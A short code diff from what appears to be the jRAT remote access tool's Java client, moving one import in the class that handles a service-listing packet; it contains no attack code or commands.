@@ -2,10 +2,10 @@ package jrat.client.packets.incoming;
 
 import jrat.client.Connection;
 import jrat.client.packets.outgoing.Packet52WindowsService;
+import oslib.OperatingSystem;
+
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
-
-import oslib.OperatingSystem;
 
 
 public class Packet77ListServices extends AbstractIncomingPacket {
